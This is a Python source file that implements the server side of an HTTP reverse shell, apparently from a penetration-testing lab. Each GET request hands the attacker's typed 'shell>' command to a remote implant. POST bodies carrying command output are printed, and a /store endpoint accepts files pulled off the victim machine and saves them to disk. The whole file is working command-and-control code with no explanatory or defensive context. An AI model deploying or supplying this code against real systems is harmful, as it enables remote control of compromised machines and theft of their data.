import http.server
import os
import cgi

HOST_NAME = "192.168.42.85"
PORT_NUMBER = 8080
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("shell> ")
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(command.encode())
    def do_POST(self):
        if self.path == "/store":
            try:
                ctype,pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD':'POST'})
                else:
                    print("unexpected post request")
                fs_up = fs['file']
                with open("/root/Desktop/1.txt","wb") as o:
                    print("writing to file")
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postvar = self.rfile.read(length)
        print(postvar.decode())
if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME,PORT_NUMBER),MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("server is terminated")
        httpd.server_close()
